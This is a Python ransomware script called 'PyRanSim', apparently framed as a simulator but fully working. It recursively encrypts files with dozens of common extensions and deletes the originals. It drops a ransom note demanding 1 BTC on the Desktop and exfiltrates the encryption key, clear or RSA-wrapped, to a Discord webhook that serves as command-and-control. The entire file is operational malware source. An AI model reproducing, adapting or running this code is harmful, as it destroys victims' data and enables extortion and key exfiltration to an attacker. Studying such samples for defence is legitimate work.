import os
import sys
import argparse
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend


# List of file extensions to encrypt
Target_Extensions = [
    'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'txt', 'rtf', 'pdf', 'epub', 'md', 
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'json', 'xml', 'csv', 'mp3', 'm4a', 'mp4', 
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', 'db', 'sql', 
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', 'zip', '7z', 
    'rar', 'tar', 'tgz'
]


Discord_Webhook_URL = 'Your_Discord_Webhook_URL'  # Replace with your actual Discord webhook URL


# Hardcoded public key for encrypting the data encryption key
PUBLIC_KEY_PEM = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApwkOKwLPZtmAQs6issXj
F2weDGMz3369tWKfMVIVK9Em4f8FDrCZHS04NxTxIdtGXABKadQ+BRoa8r/Jy8Fs
avMW83flj/DW8e4K4h8T5gQqRBpTUATeeKzIZk3cGWHKrT0VjW2d911YvIGJf8yL
TBCrhfeE9Ad4qHiMFuf5EyXt1xKFv/F4EGfbmALWqXX2itTMLzr1GKSeltc1Euce
qEblB0M/ZCCdigsinul759wEmM1HbroVb6Zx3MEKioLN+IhIzNnk8X5nmDl+DLA7
nngScQNGG0TqUza9wcO4tiOXmrQkihUdYgvMwgaf52JtI3rnp3gNj5idz7azsSnd
FwIDAQAB
-----END PUBLIC KEY-----
"""

# This function generates and saves a copy of file encryption key locally
def ransom_key():
    key = Fernet.generate_key()
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)
    return open("ransom_key.key", "rb").read()


# This function encrypts a single file and changes it's extension to .pyransim
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    
    with open(file_path, "rb") as file_original:
        file_data = file_original.read()
    
    encrypted_data = fernet.encrypt(file_data)
    
    encrypted_file_path = file_path + ".pyransim"
    with open(encrypted_file_path, "wb") as file_encrypted:
        file_encrypted.write(encrypted_data)
    print ("File encrypted: " + file_path)
    
    os.remove(file_path)


# This function recursively encrypts all files with target extensions in the directory
def encrypt_recursive(directory, key):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            if any(file_name.endswith(ext) for ext in Target_Extensions):
                file_path = os.path.join(root, file_name)
                encrypt_file(file_path, key)


# This function creates a ransome note on users desktop
def ransom_note():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop, "Ransom_Note.txt")
    note_content = """\t===========\n\t| WARNING |\n\t===========\n
			\nYour files have been encrypted by PyRanSim!!!\n
			\nTo decrypt them, send 1 BTC to this wallet address.\n
			\nAfter payment, you will receive the decryption key.\n
			\nHave a nice day!\n
                    """
    with open(note_path, "w") as note:
        note.write(note_content)


# This function exfil the encryption key to discord using webhook
def C2_discord(content):
    data = {"content": content}
    response = requests.post(Discord_Webhook_URL, json=data)
    if response.status_code == 204:
        print("Message posted to Discord successfully.")
    else:
        print("Failed to post message to Discord.")


# Function to handle command line arguments and help menu
def cmd_args():
    parser = argparse.ArgumentParser(epilog="CMD Example: python encryptor.py -p \"C:\path\\to\demo_files\" -x [clear or encrypted]")
    parser.add_argument('-p', '--path', type=str, required=True, help="Directory path to encrypt")
    parser.add_argument('-x', '--exfiltration', choices=['clear', 'encrypted'], required=True, help="Exfiltration type: clear or encrypted")
    return parser.parse_args()


# Main function for the encryption script
def main():
    if '-h' in sys.argv or '--help' in sys.argv:
        args = cmd_args()
        sys.exit(1)

    if len(sys.argv) <= 4:
        print("Error: Required arguments missing.")
        print("Display help message: python encryptor_v2.py -h")
        sys.exit(1)

    # Generate encryption key, encrypt all files and place ransom note on desktop
    args = cmd_args()
    key = ransom_key()
    encrypt_recursive(args.path, key)
    ransom_note()

    # Exfiltrate key based on selected method [clear or encrypted]
    if args.exfiltration == 'clear':
        C2_discord(f"Clear Key: {key.decode()}")
    elif args.exfiltration == 'encrypted':
        pub_key = serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode(), backend=default_backend())
        encrypted_key = pub_key.encrypt(key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        C2_discord(f"Encrypted Key: {encrypted_key.hex()}")

    print("\n\nAll files have been encrypted. Check the ransom note on your desktop.")

if __name__ == "__main__":
    main()
